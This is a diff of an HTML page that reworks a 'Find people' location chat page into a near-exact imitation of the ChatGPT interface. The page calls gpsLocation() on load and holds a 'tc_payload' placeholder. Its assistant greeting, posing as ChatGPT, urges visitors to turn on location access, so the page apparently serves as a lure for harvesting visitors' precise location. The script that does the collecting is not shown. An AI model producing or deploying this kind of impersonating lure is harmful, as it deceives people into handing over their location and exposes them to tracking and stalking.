@@ -1,51 +1,150 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
+
 <head>
   <meta charset="UTF-8">
-  <title>Find - people</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ChatGPT</title>
   <link rel="stylesheet" href="./style.css">
-
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
+
 <body onload="gpsLocation()">
-<section class="msger">
-  <header class="msger-header">
-    <div class="msger-header-title">
-      <i class="fas fa-comment-alt"></i> Location ChatGPT 4
+  <div class="sidebar-overlay"></div>
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <button class="sidebar-logo">
+        <i class="fas fa-comment"></i>
+      </button>
+      <button class="sidebar-toggle">
+        <i class="fas fa-sidebar"></i>
+      </button>
     </div>
-    <div class="msger-header-options">
-      <span><i class="fas fa-cog"></i></span>
+
+    <button class="new-chat-btn">
+      <i class="fas fa-pen"></i> New chat
+    </button>
+
+    <button class="sidebar-btn">
+      <i class="fas fa-magnifying-glass"></i> Search chats
+    </button>
+
+    <button class="sidebar-btn">
+      <i class="fas fa-book"></i> Library
+    </button>
+
+    <button class="sidebar-btn">
+      <i class="fas fa-folder"></i> Projects
+    </button>
+
+    <div class="sidebar-section">
+      <div class="sidebar-section-title">GPTs</div>
+      <button class="sidebar-btn">
+        <i class="fas fa-compass"></i> Explore
+      </button>
     </div>
-  </header>
 
-  <main class="msger-chat">
-    <div class="msg left-msg">
-      <div
-       class="msg-img"
-       style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"
-      ></div>
-
-      <div class="msg-bubble">
-        <div class="msg-info">
-          <div class="msg-info-name">Admin</div>
-          <div class="msg-info-time"></div>
+    <div class="sidebar-footer">
+      <button class="upgrade-btn">
+        <i class="fas fa-user"></i>
+        <div class="upgrade-info">
+          <div class="upgrade-name">Unknown</div>
+          <div class="upgrade-plan">Free</div>
         </div>
+        <span class="upgrade-label">Upgrade</span>
+      </button>
+    </div>
+  </aside>
 
-        <div class="msg-text">
-          Hi Welcome to Location GPT-4. Turn on your location for find people near you.📍
+  <!-- Main Content -->
+  <section class="msger">
+    <header class="msger-header">
+      <div class="msger-header-left">
+        <button class="header-icon-btn">
+          <i class="fas fa-bars"></i>
+        </button>
+        <div class="msger-header-title">
+          ChatGPT
         </div>
       </div>
-    </div>
 
-  </main>
+      <div class="msger-header-center">
+        <button class="beta-badge">
+          <i class="fas fa-arrow-up"></i> Upgrade to Go
+        </button>
+      </div>
 
-  <form class="msger-inputarea">
-    <input type="text" class="msger-input" placeholder="Ask me anything...">
-    <button type="submit" class="msger-send-btn">Send</button>
-  </form>
-</section>
-<script  src="./script.js"></script>
-<p id="techchip"></p>
-<!-- tc_payload -->
+      <div class="msger-header-right">
+        <button class="header-btn">
+          <i class="fas fa-arrow-up-from-bracket"></i> Share
+        </button>
+        <button class="header-btn">
+          <i class="fas fa-user-plus"></i> Add people
+        </button>
+        <button class="header-icon-btn">
+          <i class="fas fa-ellipsis"></i>
+        </button>
+      </div>
+    </header>
+
+    <main class="msger-chat">
+      <div class="msg left-msg">
+        <div class="msg-container">
+          <div class="msg-img">
+            <i class="fas fa-robot"></i>
+          </div>
+
+          <div class="msg-content">
+            <div class="msg-info-name">ChatGPT</div>
+
+            <div class="msg-text">
+              Hello! I can help you discover nearby locations, services, and connect with people in your area. To
+              provide you with personalized recommendations, I'll need access to your location. This helps me give you
+              the most accurate and relevant results. 📍
+            </div>
+
+            <div class="msg-actions">
+              <button class="msg-action-btn" title="Copy"><i class="far fa-copy"></i></button>
+              <button class="msg-action-btn" title="Like"><i class="far fa-thumbs-up"></i></button>
+              <button class="msg-action-btn" title="Dislike"><i class="far fa-thumbs-down"></i></button>
+              <button class="msg-action-btn" title="Share"><i class="fas fa-share-nodes"></i></button>
+              <button class="msg-action-btn" title="Regenerate"><i class="fas fa-rotate-right"></i></button>
+              <button class="msg-action-btn" title="More"><i class="fas fa-ellipsis"></i></button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </main>
+
+    <form class="msger-inputarea">
+      <div class="input-wrapper">
+        <button type="button" class="input-icon" title="Attach file">
+          <i class="fas fa-paperclip"></i>
+        </button>
+
+        <textarea class="msger-input" placeholder="Ask anything" rows="1"></textarea>
+
+        <div class="input-icons">
+          <button type="button" class="input-icon" title="Voice input">
+            <i class="fas fa-microphone"></i>
+          </button>
+          <button type="submit" class="msger-send-btn">
+            <i class="fas fa-arrow-up"></i>
+          </button>
+        </div>
+      </div>
+
+      <div class="input-footer">
+        ChatGPT can make mistakes. Check important info.
+      </div>
+    </form>
+  </section>
+  <script src="./script.js"></script>
+  <p id="techchip"></p>
+  <!-- tc_payload -->
 
 </body>
+
 </html>
